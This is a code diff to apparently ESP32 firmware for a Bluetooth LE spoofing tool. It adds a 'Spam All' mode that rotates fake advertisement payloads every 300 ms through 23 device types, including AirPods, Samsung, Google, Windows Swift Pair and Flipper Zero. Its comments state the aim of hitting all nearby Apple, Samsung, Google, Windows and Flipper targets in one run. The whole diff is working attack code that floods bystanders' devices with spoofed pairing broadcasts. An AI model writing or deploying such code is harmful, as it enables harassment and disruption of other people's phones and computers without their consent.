@@ -409,6 +409,15 @@ static uint32_t s_addrRotateMs = 0;
 
 int scanTime = 5;
 int deviceType = 1;
+/* Spam All: deviceType 24 cycles the payload through every vendor/model on a
+ * timer instead of advertising one fixed device, so nearby Apple, Samsung,
+ * Google, Windows and Flipper targets all get hit from one run. */
+static constexpr int SPOOF_TYPE_MAX   = 23;   // the real per-device types
+static constexpr int SPOOF_TYPE_ALL   = 24;   // the Spam All pseudo-type
+static bool     s_spamAll   = false;
+static int      s_spamTick  = 1;              // which real type the rotation is on
+static uint32_t s_spamMs    = 0;
+static constexpr uint32_t SPAM_ROTATE_MS = 300;
 int delaySeconds = 1;
 int advType = 1;
 int attack_state = 1;
@@ -751,6 +760,7 @@ static const char* spooferDeviceLabel(int type) {
     case 21: return "Google Smart Ctrl";
     case 22: return "Swift Pair (Win)";
     case 23: return "Flipper Zero";
+    case 24: return "Spam All";
     default: return "Airpods";
   }
 }
@@ -997,9 +1007,9 @@ void Flipper_Zero() {
   attack_state = 1;
 }
 
-void setAdvertisingData() {
+static void applySpoofType(int t) {
 
-  switch (deviceType) {
+  switch (t) {
     case 1:
       Airpods();
       break;
@@ -1075,6 +1085,17 @@ void setAdvertisingData() {
   }
 }
 
+void setAdvertisingData() {
+  s_spamAll = (deviceType == SPOOF_TYPE_ALL);
+  if (s_spamAll) {
+    s_spamTick = 1;          // start the rotation at the first type
+    s_spamMs = 0;
+    applySpoofType(s_spamTick);
+  } else {
+    applySpoofType(deviceType);
+  }
+}
+
 void handleButtonPress(int pin, void (*callback)()) {
   static unsigned long lastPressTime[8] = {0};
   static uint8_t lastState[8] = {HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH};
@@ -1096,7 +1117,7 @@ void handleButtonPress(int pin, void (*callback)()) {
 
 void changeDeviceTypeNext() {
   deviceType++;
-  if (deviceType > 23) deviceType = 1;
+  if (deviceType > SPOOF_TYPE_ALL) deviceType = 1;
   Serial.println("Device Type Next: " + String(deviceType));
   setAdvertisingData();
   updateSpoofer();
@@ -1104,7 +1125,7 @@ void changeDeviceTypeNext() {
 
 void changeDeviceTypePrev() {
   deviceType--;
-  if (deviceType < 1) deviceType = 23;
+  if (deviceType < 1) deviceType = SPOOF_TYPE_ALL;
   Serial.println("Device Type Prev: " + String(deviceType));
   setAdvertisingData();
   updateSpoofer();
@@ -1333,6 +1354,23 @@ void spooferLoop() {
 
     handleButtonPress(BTN_DOWN, changeAdvTypeNext);
     handleButtonPress(BTN_UP, toggleAdvertising);
+  }
+
+  /* Spam All: rotate the payload through every device type on its own clock,
+   * so one run cycles Apple -> Samsung -> Google -> Windows -> Flipper. The
+   * address keeps rotating separately below. */
+  if (s_spamAll && isAdvertising && pAdvertising) {
+    const uint32_t nowMs = millis();
+    if (nowMs - s_spamMs >= SPAM_ROTATE_MS) {
+      s_spamMs = nowMs;
+      s_spamTick = (s_spamTick % SPOOF_TYPE_MAX) + 1;   // 1..SPOOF_TYPE_MAX
+      applySpoofType(s_spamTick);
+      BLEAdvertisementData d = getAdvertismentData();
+      pAdvertising->stop();
+      pAdvertising->setAdvertisementData(d);
+      pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);  // broadcast only, never connectable
+      pAdvertising->start();
+    }
   }
 
   /* Outside the 50 ms UI gate: the address should rotate on its own clock,
